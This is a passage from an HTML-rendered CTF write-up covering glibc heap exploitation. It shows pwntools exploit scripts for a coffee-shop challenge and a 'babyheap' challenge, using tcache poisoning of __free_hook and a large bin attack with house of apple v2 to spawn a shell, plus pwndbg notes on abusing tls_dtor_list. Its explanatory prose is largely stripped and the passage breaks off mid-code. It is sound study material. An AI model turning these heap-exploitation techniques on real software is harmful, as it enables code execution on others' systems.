class="string">b&quot;Y&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Ok,please input what you need in coffee&quot;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    menu(<span class="number">0x1145</span>)</span><br><span class="line">    sa(<span class="string">b&quot;please input the admin password&quot;</span>, <span class="string">b&quot;just pwn it&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quit_admin</span>():</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">replenish</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    admin()</span><br><span class="line">    sla(<span class="string">b&quot;&gt;&gt;&gt;&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    sa(<span class="string">b&quot;input the id you want to replenish&quot;</span>, itob(<span class="built_in">id</span>))</span><br><span class="line">    quit_admin()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_default</span>(<span class="params"><span class="built_in">id</span>, pos, con</span>):</span><br><span class="line">    admin()</span><br><span class="line">    sla(<span class="string">b&quot;&gt;&gt;&gt;&quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    sa(<span class="string">b&quot;input the id you want to change&quot;</span>, itob(<span class="built_in">id</span>))</span><br><span class="line">    sa(<span class="string">b&quot;input which coffee you want to change&quot;</span>, itob(pos))</span><br><span class="line">    sa(<span class="string">b&quot;input your content&quot;</span>, con)</span><br><span class="line">    quit_admin()</span><br><span class="line"></span><br><span class="line">free_got = elf.got.free</span><br><span class="line">cofflist = <span class="number">0x4062F0</span></span><br><span class="line">stderr = <span class="number">0x4062e0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    buy(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">replenish(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">buy(<span class="number">1</span>)</span><br><span class="line">change_default(<span class="number">1</span>, <span class="number">4</span>, p64(cofflist))</span><br><span class="line">replenish(<span class="number">1</span>)</span><br><span class="line">replenish(<span class="number">1</span>)</span><br><span class="line">change_default(<span class="number">1</span>, <span class="number">2</span>, p64(stderr))</span><br><span class="line">show()</span><br><span class="line">leak = uu64()</span><br><span class="line">libc.address = leak - <span class="number">0x1ed5c0</span></span><br><span class="line">lg(<span class="string">&#x27;libc.address&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    buy(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">replenish(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">buy(<span class="number">3</span>)</span><br><span class="line">change_default(<span class="number">3</span>, <span class="number">4</span>, p64(libc.sym.__free_hook))</span><br><span class="line"></span><br><span class="line">replenish(<span class="number">3</span>)</span><br><span class="line">replenish(<span class="number">3</span>)</span><br><span class="line">change_default(<span class="number">3</span>, <span class="number">2</span>, p64(libc.sym.system))</span><br><span class="line"></span><br><span class="line">buy(<span class="number">3</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg(p)</span></span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><p>unlink_chunkassert</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect(fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br></pre></td></tr></table></figure><p> 0</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">read_con</span><span class="params">(<span class="type">char</span> *ptr, <span class="type">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+13h] [rbp-Dh] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ptr[i] = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  ptr[i] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v5 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sizebin tcache, unsorted, large bin</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">size &gt; <span class="number">0x3FF</span> &amp;&amp; size &lt;= <span class="number">0x500</span></span><br></pre></td></tr></table></figure><p><code>large bin attack</code>house of apple </p><ul><li>a-b-caputsshow<code>\x00</code> a free_chunkarenaleaklarge bin arena0</li><li>free b, a-b malloc d, a &amp; dchunkuaf</li><li>large bin attack  free a, alargebin da <code>bk_nextsize</code>   <code>io_list_all-0x20</code> <code>a</code> sizechunk <code>e</code><code>e</code>large bin <code>io_list_all =&gt; heap a</code></li><li>house_of_appleda<code>fake_io</code></li><li>IO</li></ul><p>house of apple exp</p><ul><li>kaliglibc 2.37 libc2.38 patcharena0</li><li> <code>rdi/flag</code> </li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">data</span>): <span class="keyword">return</span> p.send(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">delim, data</span>): <span class="keyword">return</span> p.sendafter(delim, data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">data</span>): <span class="keyword">return</span> p.sendline(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">delim, data</span>): <span class="keyword">return</span> p.sendlineafter(delim, data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">num=<span class="number">4096</span></span>): <span class="keyword">return</span> p.recv(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">delim, drop=<span class="literal">False</span></span>): <span class="keyword">return</span> p.recvuntil(delim, drop)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> p.recvline(timeout=<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">itr</span>(): <span class="keyword">return</span> p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">name</span>): <span class="keyword">return</span> log.success(</span><br><span class="line">    <span class="string">&#x27;\033[32m%s ==&gt; 0x%x\033[0m&#x27;</span> % (name, <span class="built_in">eval</span>(name)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uu64</span>(): <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">itob</span>(<span class="params">num</span>): <span class="keyword">return</span> <span class="built_in">str</span>(num).encode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">p</span>):</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">file = <span class="string">&#x27;babyheap&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(file, checksec=<span class="literal">False</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">context.binary = elf</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p = elf.process()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">cmd</span>):</span><br><span class="line">    sla(<span class="string">b&quot;&gt;&gt;&quot;</span>, itob(cmd))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">sz, con</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&quot;input your name size&quot;</span>, itob(sz))</span><br><span class="line">    sa(<span class="string">b&quot;input your name&quot;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, sz, con</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">b&quot;input index&quot;</span>, itob(idx))</span><br><span class="line">    sla(<span class="string">b&quot;input your name size&quot;</span>, itob(sz))</span><br><span class="line">    sa(<span class="string">b&quot;input your name&quot;</span>, con)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">b&quot;input index&quot;</span>, itob(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">b&quot;input index&quot;</span>, itob(idx))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">heap_base = heap_addr - <span class="number">0x2a0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4f8</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x4f8</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x418</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x428</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x4f8</span>, <span class="string">b&#x27;a\n&#x27;</span>) <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x448</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 6</span></span><br><span class="line"></span><br><span class="line">payload = fit(&#123;</span><br><span class="line">    <span class="number">0x0</span>: heap_base+<span class="number">0x2b0</span>+<span class="number">0x500</span>,</span><br><span class="line">    <span class="number">0x8</span>: heap_base+<span class="number">0x2b0</span>+<span class="number">0x500</span>,</span><br><span class="line">    <span class="number">0x410</span>: <span class="number">0x420</span></span><br><span class="line">&#125;, filler = <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, <span class="number">0x418</span>, payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">leak = uu64()</span><br><span class="line">libc.address = leak - <span class="number">0x1d3ce0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x4f8</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 7</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = fit(&#123;</span><br><span class="line">    <span class="number">0x0</span>: heap_base+<span class="number">0xff0</span>+<span class="number">0x500</span>,</span><br><span class="line">    <span class="number">0x8</span>: heap_base+<span class="number">0xff0</span>+<span class="number">0x500</span>,</span><br><span class="line">    <span class="number">0x420</span>: <span class="number">0x430</span></span><br><span class="line">&#125;, filler = <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">edit(<span class="number">4</span>, <span class="number">0x428</span>, payload)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0x428</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x4f8</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ## large bin attack =&gt; IO_list_all -&gt; chunk0</span></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0x4f8</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 5</span></span><br><span class="line"></span><br><span class="line">payload = fit(&#123;</span><br><span class="line">    <span class="number">0x18</span>: libc.sym._IO_list_all - <span class="number">0x20</span>,</span><br><span class="line">&#125;, filler = <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">edit(<span class="number">4</span>, <span class="built_in">len</span>(payload) + <span class="number">1</span>, payload + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x4f8</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # house of apple v2</span></span><br><span class="line">fs = FileStructure()</span><br><span class="line">fs.vtable = libc.sym._IO_wfile_jumps</span><br><span class="line"><span class="comment"># write_base &lt; write_ptr</span></span><br><span class="line">fs._IO_write_base = <span class="number">0</span></span><br><span class="line">fs._IO_write_ptr = <span class="number">1</span></span><br><span class="line">fs.chain = <span class="number">0</span></span><br><span class="line"><span class="comment"># fs._lock = libc.sym._IO_stdfile_2_lock</span></span><br><span class="line"><span class="comment"># lock </span></span><br><span class="line">fs._lock = libc.address + <span class="number">0x1d5a20</span></span><br><span class="line"><span class="comment"># # codecvt = ?</span></span><br><span class="line"><span class="comment"># fs._codecvt = ?</span></span><br><span class="line">fs._wide_data = heap_base + <span class="number">0xff0</span> + <span class="number">0x500</span></span><br><span class="line">payload = <span class="built_in">bytes</span>(fs)[<span class="number">0x10</span>:]</span><br><span class="line">edit(<span class="number">1</span>, <span class="built_in">len</span>(payload) + <span class="number">1</span>, payload + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">wdata = fit(&#123;</span><br><span class="line">    <span class="number">0xe0</span>-<span class="number">0x10</span>: heap_base+<span class="number">0xff0</span>+<span class="number">0xe0</span>+<span class="number">0x10</span>+<span class="number">0x500</span>,</span><br><span class="line">    <span class="number">0xe0</span>: &#123;</span><br><span class="line">        <span class="number">0x68</span>: libc.sym.system</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">edit(<span class="number">4</span>, <span class="built_in">len</span>(wdata) + <span class="number">1</span>, wdata + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;heap_addr&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;heap_base&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;leak&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;libc.address&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x4f0</span> + <span class="string">b&quot;     sh;&quot;</span>  <span class="comment"># flag rdi</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg(p)</span></span><br><span class="line">menu(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><p>large bin leaktcache bin</p><ul><li>tcacheTLS__call_tls_dtorssystem(&#x2F;bin&#x2F;sh)</li><li>IO leak </li></ul><h3 id="tls-dtor"><a href="#tls-dtor" class="headerlink" title="tls_dtor"></a>tls_dtor</h3><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exit</span><br><span class="line">__run_exit_handlers</span><br><span class="line">__call_tls_dtors</span><br></pre></td></tr></table></figure><p></p><ul><li></li><li></li><li><code>PTR_DEMANGLE</code> </li><li></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__call_tls_dtors (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> (tls_dtor_list)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">struct</span> <span class="title class_">dtor_list</span> *cur = tls_dtor_list;</span><br><span class="line">      dtor_func func = cur-&gt;func;</span><br><span class="line">      <span class="built_in">PTR_DEMANGLE</span> (func);</span><br><span class="line"></span><br><span class="line">      tls_dtor_list = tls_dtor_list-&gt;next;</span><br><span class="line">      <span class="built_in">func</span> (cur-&gt;obj);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Ensure that the MAP dereference happens before</span></span><br><span class="line"><span class="comment"> l_tls_dtor_count decrement.  That way, we protect this access from a</span></span><br><span class="line"><span class="comment"> potential DSO unload in _dl_close_worker, which happens when</span></span><br><span class="line"><span class="comment"> l_tls_dtor_count is 0.  See CONCURRENCY NOTES for more detail.  */</span></span><br><span class="line">      <span class="built_in">atomic_fetch_add_release</span> (&amp;cur-&gt;map-&gt;l_tls_dtor_count, <span class="number">-1</span>);</span><br><span class="line">      <span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">libc_hidden_def</span> (__call_tls_dtors)</span><br></pre></td></tr></table></figure><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*dtor_func)</span> <span class="params">(<span class="type">void</span> *)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// destructor list</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">dtor_list</span></span><br><span class="line">&#123;</span><br><span class="line">  dtor_func func;</span><br><span class="line">  <span class="type">void</span> *obj;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">link_map</span> *map;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">dtor_list</span> *next;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>PTR_DEMANGLE </p><ul><li>0x11</li><li> pointer_guard </li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> PTR_DEMANGLE(reg)ror $2*LP_SIZE+1, reg;      \</span></span><br><span class="line"><span class="meta">xor %fs:POINTER_GUARD, reg</span></span><br></pre></td></tr></table></figure><p>0</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p tls_dtor_list</span><br><span class="line"><span class="variable">$1</span> = (struct dtor_list *) 0x0</span><br></pre></td></tr></table></figure><p> <code>dtor_list</code> </p><ul><li>func  pointer_guard 11</li><li>obj </li></ul><p></p><ul><li>tls_dtor_list  fs </li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">set</span> tls_dtor_list=1   <span class="comment"># </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; p <span class="variable">$rbp</span></span><br><span class="line"><span class="variable">$4</span> = (void *) 0xffffffffffffffb0</span><br><span class="line">pwndbg&gt; p (long)<span class="variable">$rbp</span></span><br><span class="line"><span class="variable">$5</span> = -80</span><br><span class="line"></span><br><span class="line">0x7ffff7e02606 &lt;__call_tls_dtors+6&gt;     mov    rbp, qword ptr [rip + 0x194773]</span><br><span class="line">0x7ffff7e0260d &lt;__call_tls_dtors+13&gt;    mov    rbx, qword ptr fs:[rbp]</span><br><span class="line">0x7ffff7e02612 &lt;__call_tls_dtors+18&gt;    <span class="built_in">test</span>   rbx, rbx                        <span class="comment"># tls_dtor_list </span></span><br><span class="line">0x7ffff7e02615 &lt;__call_tls_dtors+21&gt;    je     __call_tls_dtors+94                &lt;__call_tls_dtors+94&gt;</span><br><span class="line">0x7ffff7e02617 &lt;__call_tls_dtors+23&gt;    nop    word ptr [rax + rax]</span><br><span class="line"> 0x7ffff7e02620 &lt;__call_tls_dtors+32&gt;    mov    rdx, qword ptr [rbx + 0x18]   <span class="comment"># next </span></span><br><span class="line">0x7ffff7e02624 &lt;__call_tls_dtors+36&gt;    mov    rax, qword ptr [rbx]            <span class="comment"># func</span></span><br><span class="line">0x7ffff7e02627 &lt;__call_tls_dtors+39&gt;    ror    rax, 0x11                       <span class="comment"># </span></span><br><span class="line">0x7ffff7e0262b &lt;__call_tls_dtors+43&gt;    xor    rax, qword ptr fs:[0x30]        <span class="comment"># pointer_guard </span></span><br><span class="line">0x7ffff7e02634 &lt;__call_tls_dtors+52&gt;    mov    qword ptr fs:[rbp], rdx</span><br><span class="line">0x7ffff7e02639 &lt;__call_tls_dtors+57&gt;    mov    rdi, qword ptr [rbx + 8]</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/xg <span class="variable">$fs_base</span>+0x30</span><br><span class="line">0x7ffff7dc1770: 0x851e64b26accf332</span><br></pre></td></tr></table></figure><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rol</span>(<span class="params">addr</span>):</span><br><span class="line"><span class="keyword">return</span> ((addr &lt;&lt; <span class="number">0x11</span>) &amp; <span class="number">0xffffffffffffffff</span>) | (addr &gt;&gt; <span class="number">0x2f</span>)</span><br></pre></td></tr></table></figure><p>demo <a href="https://zhuanlan.zhihu.com/p/654914149">glibc2.35-tls_dtor_listexit</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="title">rotate_left</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> value, <span class="type">int</span> left)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (value &lt;&lt; left) | (value &gt;&gt; (<span class="built_in">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) * <span class="number">8</span> - left));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fs_base;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> index = <span class="number">0xffffffffffffffa8</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> tls_dtor_list_addr;</span><br><span class="line">  <span class="type">unsigned</span> <span 